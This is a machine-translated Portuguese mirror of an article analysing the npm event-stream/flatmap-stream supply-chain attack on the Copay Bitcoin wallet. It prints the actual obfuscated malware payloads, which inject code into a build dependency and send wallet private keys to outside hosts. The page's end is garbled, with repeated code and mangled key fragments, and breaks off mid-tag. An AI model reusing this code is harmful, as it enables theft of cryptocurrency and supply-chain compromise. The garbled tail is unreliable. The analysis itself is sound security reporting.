<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üôà üë©üèæ‚Äçüè´ ü•£ A hist√≥ria da facilidade escandalosa de invadir a infraestrutura moderna de desenvolvimento de software üõ©Ô∏è üíÉüèø ü•É</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="No final de outubro, uma mensagem de problema apareceu na extremamente popular ferramenta nodemon Node.js. O problema foi que o seguinte aviso foi exi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>A hist√≥ria da facilidade escandalosa de invadir a infraestrutura moderna de desenvolvimento de software</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/434116/"> No final de outubro, uma mensagem de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">problema</a> apareceu na extremamente popular ferramenta nodemon Node.js.  O problema foi que o seguinte aviso foi exibido no console: <code>DeprecationWarning: crypto.createDecipher is deprecated</code> .  Esses alertas sobre recursos desatualizados n√£o s√£o incomuns.  Em particular, essa mensagem parecia bastante inofensiva.  Ele nem se referia ao projeto nodemon em si, mas a uma de suas depend√™ncias.  Essa ninharia poderia muito bem passar despercebida por qualquer pessoa, pois, em muitos casos, esses problemas s√£o resolvidos por eles mesmos. <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/c03/31c/c19/c0331cc19ca77d9bc4ce383faec3c2b8.jpg" alt="imagem"></a> <br><br>  Cerca de duas semanas ap√≥s a primeira men√ß√£o desse problema, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Ayrton Sparling</a> verificou tudo e descobriu que o motivo do aviso era um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">novo v√≠cio</a> bastante profundo.  A mensagem veio de um peda√ßo estranho de c√≥digo no final de um arquivo JavaScript minificado que n√£o estava nas vers√µes anteriores da biblioteca e que, de uma vers√£o posterior, foi exclu√≠da.  A pesquisa de Ayrton levou-o ao popular pacote npm de fluxo de eventos, que √© baixado cerca de dois milh√µes de vezes por semana, e at√© recentemente estava sob o controle de um desenvolvedor de c√≥digo aberto com boa reputa√ß√£o. <br><a name="habracut"></a><br>  Alguns meses atr√°s, o controle do fluxo de eventos foi transferido para outra pessoa, um usu√°rio pouco conhecido que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">solicitou</a> , por email, o direito de publicar o pacote.  Isso foi feito legalmente.  Em seguida, esse usu√°rio atualizou o pacote de fluxo de eventos, incluindo a depend√™ncia de malware de fluxo de mapa plano em sua vers√£o de patch e, depois disso, publicou uma nova vers√£o principal do pacote sem essa depend√™ncia.  Gra√ßas a isso, ele queria tornar a mudan√ßa menos percept√≠vel.  Novos usu√°rios, com maior probabilidade de interesse em depend√™ncias, instalariam a vers√£o mais recente do fluxo de eventos (4.x no momento da reda√ß√£o deste artigo).  E os usu√°rios cujos projetos dependiam da vers√£o anterior do pacote instalariam automaticamente a vers√£o do patch infectado na pr√≥xima vez em que executassem o comando <code>npm install</code> (isso leva em considera√ß√£o a abordagem comum para configurar vers√µes do pacote adequadas para atualiza√ß√µes). <br><br><h2>  <font color="#3AC1EF">Detalhes do incidente</font> </h2><br>  O c√≥digo malicioso do flatmap-stream foi configurado para funcionar com um arquivo de dados que, al√©m de algumas linhas muito ofuscadas de forma trivial, continha dois fragmentos criptografados, que s√≥ podiam ser descriptografados sabendo a senha. <br><br><pre> <code class="javascript hljs">! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>,           t = process;       <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function">) </span></span>{           <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> Buffer.from(r, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString()       }       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = r(e(<span class="hljs-string"><span class="hljs-string">"2e2f746573742f64617461"</span></span>)),           o = t[e(n[<span class="hljs-number"><span class="hljs-number">3</span></span>])][e(n[<span class="hljs-number"><span class="hljs-number">4</span></span>])];       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!o) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u = r(e(n[<span class="hljs-number"><span class="hljs-number">2</span></span>]))[e(n[<span class="hljs-number"><span class="hljs-number">6</span></span>])](e(n[<span class="hljs-number"><span class="hljs-number">5</span></span>]), o),           a = u.update(n[<span class="hljs-number"><span class="hljs-number">0</span></span>], e(n[<span class="hljs-number"><span class="hljs-number">8</span></span>]), e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));       a += u.final(e(n[<span class="hljs-number"><span class="hljs-number">9</span></span>]));       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> f = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.constructor;       f.paths = <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.paths, f[e(n[<span class="hljs-number"><span class="hljs-number">7</span></span>])](a, <span class="hljs-string"><span class="hljs-string">""</span></span>), f.exports(n[<span class="hljs-number"><span class="hljs-number">1</span></span>])   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (r) {} }();</code> </pre> <br>  Chame esse fragmento de c√≥digo <code>Payload A</code>  Ele procura a senha na vari√°vel de ambiente <code>npm_package_description</code> definida por npm.  Essa vari√°vel de ambiente cont√©m uma descri√ß√£o do pacote raiz, que permite que c√≥digos maliciosos afetem apenas um pacote de destino espec√≠fico.  Jogada inteligente!  Nesse caso, este pacote era o aplicativo cliente da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">carteira Bitcoin</a> da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Copay</a> e a senha para descriptografar o c√≥digo malicioso era a frase <a href="">A Secure Bitcoin Wallet</a> (isso foi revelado pelo usu√°rio do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">gathub maths22</a> ). <br><br>  Ap√≥s o c√≥digo da <code>Payload A</code> decodificar com √™xito o primeiro dado, o c√≥digo que chamamos de <code>Payload B</code> executado. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> <span class="hljs-built_in"><span class="hljs-built_in">module</span></span>.exports = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-regexp"><span class="hljs-regexp">/build\:.*\-release/</span></span>.test(process.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = process.env.npm_package_description,           r = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"fs"</span></span>),           i = <span class="hljs-string"><span class="hljs-string">"./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"</span></span>,           n = r.statSync(i),           c = r.readFileSync(i, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>),           o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>).createDecipher(<span class="hljs-string"><span class="hljs-string">"aes256"</span></span>, t),           s = o.update(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>);       s = <span class="hljs-string"><span class="hljs-string">"\n"</span></span> + (s += o.final(<span class="hljs-string"><span class="hljs-string">"utf8"</span></span>));       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = c.indexOf(<span class="hljs-string"><span class="hljs-string">"\n/*@@*/"</span></span>);       <span class="hljs-number"><span class="hljs-number">0</span></span> &lt;= a &amp;&amp; (c = c.substr(<span class="hljs-number"><span class="hljs-number">0</span></span>, a)), r.writeFileSync(i, c + s, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime), process.on(<span class="hljs-string"><span class="hljs-string">"exit"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{           <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {               r.writeFileSync(i, c, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>), r.utimesSync(i, n.atime, n.mtime)           } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}       })   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} };</code> </pre> <br>  Este c√≥digo verificou se o script seria executado exclusivamente com um argumento de linha de comando espec√≠fico, com algo que correspondesse ao padr√£o <code>build:*-release</code> .  Por exemplo, pode parecer com o <code>npm run build:ios-release</code> .  Caso contr√°rio, o script n√£o foi executado.  Essa execu√ß√£o de c√≥digo limitada a apenas tr√™s scripts para a constru√ß√£o de projetos usados ‚Äã‚Äãno Copay.  Ou seja, estamos falando de scripts respons√°veis ‚Äã‚Äãpela cria√ß√£o da <a href="">vers√£o desktop do aplicativo e de suas vers√µes para iOS e Android</a> . <br><br>  Em seguida, o script procurou outra depend√™ncia de aplicativo, a saber, ele estava interessado no arquivo <code>ReedSolomonDecoder.js</code> do pacote <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">@ zxing / library</a> .  O c√≥digo de <code>Payload B</code> n√£o executou este arquivo.  Ele simplesmente injetou o c√≥digo <code>Payload C</code> nele, o que levou ao fato de que esse c√≥digo seria executado no pr√≥prio aplicativo, quando o <code>ReedSolomonDecoder</code> carregado.  Aqui est√° o c√≥digo <code>Payload C</code> <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{   <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{       <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>),               a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>),               c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"</span></span>;           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{               e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString();               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({                   <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e,                   <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t,                   <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: {                       <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length,                       <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span>                   }               }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{});               r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end()           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>);                   n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span>               }               i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n)           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory;                   resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       e.getFile(t, {                           <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span>                       }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader;                               t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{                                   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result))                               }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                                   t.abort()                               }, t.readAsText(e)                           })                       })                   })               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t);                       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r))                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}                   <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                       chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t]))                       })                   } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               }           }           global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) {                   <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t];                   <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{                       <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>;                       t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t)))                   }.bind(n))               }           });           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>);           e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e);               <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {                   global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey))               } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}               <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t           }       } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {}   }   <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e()</code> \ nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C \ nDXUs / peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj \ nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW + / BiGud7b77Fwfq372fUuEIk \ N2P / pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762 \ nPDBMwQsCKQcpKDXw / 6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz \ nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl / cJ / x76To \ n2wIDAQAB \ n ----- END <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{   <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{       <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> {           <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>),               a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>),               c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"</span></span>;           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{               e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString();               <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({                   <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e,                   <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>,                   <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t,                   <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: {                       <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length,                       <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span>                   }               }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{});               r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end()           }           <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span 